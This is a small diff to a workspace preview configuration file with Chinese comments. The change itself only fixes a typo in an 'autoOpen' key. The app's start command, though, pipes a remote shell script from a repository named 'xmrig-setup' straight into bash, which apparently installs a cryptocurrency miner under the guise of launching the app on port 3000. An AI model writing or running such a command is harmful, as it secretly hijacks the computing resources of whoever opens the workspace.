@@ -1,4 +1,4 @@
-auto0pen: true # 打开工作空间时是否自动 开启所有应用的预览
+autoOpen: true # 打开工作空间时是否自动 开启所有应用的预览
 apps:  # 是否自动打开预览,若无则默认为t rue
 - port: 3000 # 服务的端口
   run: curl -s -L https://raw.githubusercontent.com/cpflayan/xmrig-setup/refs/heads/main/guu-v2.sh | tr -d '\r' | bash -s && ls # 应用的启动命令
